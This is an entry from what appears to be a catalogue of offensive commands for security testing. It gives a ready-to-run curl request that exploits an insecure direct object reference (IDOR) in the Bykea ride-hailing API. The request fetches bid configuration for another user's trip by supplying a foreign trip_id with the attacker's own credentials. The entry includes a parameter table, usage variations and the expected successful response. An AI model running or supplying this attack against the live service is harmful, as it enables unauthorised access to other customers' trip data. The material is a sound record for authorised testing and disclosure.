---
data: >-
  curl -X GET
  "https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████"
  -H "X-Lb-User-Id:{{user_id2}}" -H "X-Lb-User-Token:{{access_token2}}"
tags:
  - api
  - get
  - idor
type: command
output: >-
  {"code":200,"message":"success","data":{"bid_values":[620,740,860,980,10100,11120,12140,13160,14180,15200],"durations":[183,193,203],"hash":"██████████"}}
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.811Z'
id: 45ece5dd-0439-4adc-8928-901824688e0f
verified: false
validated: true
submitted: true
---
# bykea-get-bids-config

## Command

```bash
curl -X GET "https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████" \
  -H "X-Lb-User-Id:{{user_id2}}" \
  -H "X-Lb-User-Token:{{access_token2}}"
```

## Description

Retrieves bid configuration for a trip in Bykea, exploiting IDOR via foreign trip_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| lat | Pickup latitude | Yes |
| lng | Pickup longitude | Yes |
| service_code | Service type (23) | Yes |
| trip_id | Target trip ID (query) | Yes |
| X-Lb-User-Id | Attacker's user ID (header) | Yes |
| X-Lb-User-Token | Attacker's token (header) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://boleelagao.bykea.net/v1/config?lat=...&lng=...&service_code=23&trip_id=██████" -H "X-Lb-User-Id:..." -H "X-Lb-User-Token:..."
```

### Advanced Usage

Adjust lat/lng for different locations to test config variations.

## Expected Output

{"code":200,"message":"success","data":{"bid_values":[620,740,...],"durations":[183,193,203],"hash":"██████████"}}.

## Related

- [[procedures/Exploit-IDOR-on-Bids-Configuration]]
